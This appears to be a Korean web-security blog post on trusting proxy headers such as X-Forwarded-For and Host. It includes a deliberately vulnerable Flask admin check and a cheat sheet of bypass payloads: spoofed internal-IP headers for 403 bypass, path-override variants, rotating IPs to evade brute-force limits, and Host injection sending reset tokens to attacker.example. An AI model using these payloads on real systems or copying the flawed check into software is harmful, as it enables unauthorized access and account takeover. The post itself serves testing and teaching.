---
title: "프록시 신뢰 헤더 (X-Forwarded-For · Host)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Infrastructure]
tags: [x-forwarded-for, host-header, reverse-proxy, web]
description: "클라이언트가 바꿀 수 있는 X-Forwarded-For·Host 헤더를 접근 제어와 링크 생성에 쓸 때의 위험과, IP 위조·403 우회·Host 주입 구문을 정리합니다."
mermaid: true
---

> 리버스 프록시 뒤의 애플리케이션은 클라이언트 IP와 호스트 이름을 **헤더**로 전달받는다. 그 헤더를 누가 썼는지 확인하지 않고 믿으면 접근 제어가 무너진다.

## 개념

`X-Forwarded-For`(원래 클라이언트 IP), `X-Forwarded-Host`, `X-Real-IP`, `Host`는 **그냥 HTTP 헤더**다. 프록시가 덮어쓰거나 정리하지 않으면 클라이언트가 보낸 값이 그대로 앱에 도착한다.

```python
@app.get("/admin")
def admin():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if not ip.startswith(("127.", "10.")):   # 헤더 값을 그대로 신뢰
        abort(403)
    return "admin panel"
```

영향은 두 가지다. ① **IP 기반 접근 제어·레이트 리밋·로그인 제한 우회**(위조 IP), ② **Host 오용**(재설정 메일 링크·리다이렉트가 공격자 도메인을 가리킴). `X-Forwarded-For`는 쉼표로 이어진 목록일 수 있고, 프록시가 덧붙이는 구성에서 **맨 앞은 클라이언트가 쓴 값**이다 — 앱이 맨 앞을 쓰는지 뒤에서 세는지가 결과를 가른다.

## 공격·우회 구문

허가된 대상에만, 문서용 IP로 확인한다.

### 내부 IP 위조 (403 우회)

내부·로컬에서 온 요청으로 처리되게 만든다. 403 우회에서 가장 먼저 시도하는 헤더들이다.

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-Host: localhost
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
Forwarded: for=127.0.0.1
```

### 메서드·경로 우회 (403 동반)

```
X-HTTP-Method-Override: GET
X-Original-URL: /admin
X-Rewrite-URL: /admin
경로 변형: /admin → /Admin, /admin/, /%2e/admin, /admin..;/
```

### 레이트 리밋·로그인 제한 우회

```
요청마다 X-Forwarded-For 값을 바꿔 계정/IP 카운터를 분산
X-Forwarded-For: 1.1.1.1 / 1.1.1.2 / ... (무차별 대입 지속)
```

### Host 주입

```
POST /reset  →  Host: attacker.example
결과 메일 링크: https://attacker.example/reset?token=...  (클릭 시 토큰 탈취)
리다이렉트 Location·절대 URL·캐시 키가 Host를 따라 바뀌는지
```

### 확인 요령

```
"내 IP 표시"·로그 화면·제한 카운터에 넣은 값이 반영되면 헤더 신뢰
프록시를 거치지 않고 앱에 직접 닿는 경로(내부 주소·다른 포트)가 있으면 헤더 정리 무의미
```

## 참고 자료

- [RFC 7239: Forwarded HTTP Extension](https://www.rfc-editor.org/rfc/rfc7239)
- [OWASP WSTG: Testing for Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- [CWE-348: Use of Less Trusted Source](https://cwe.mitre.org/data/definitions/348.html)
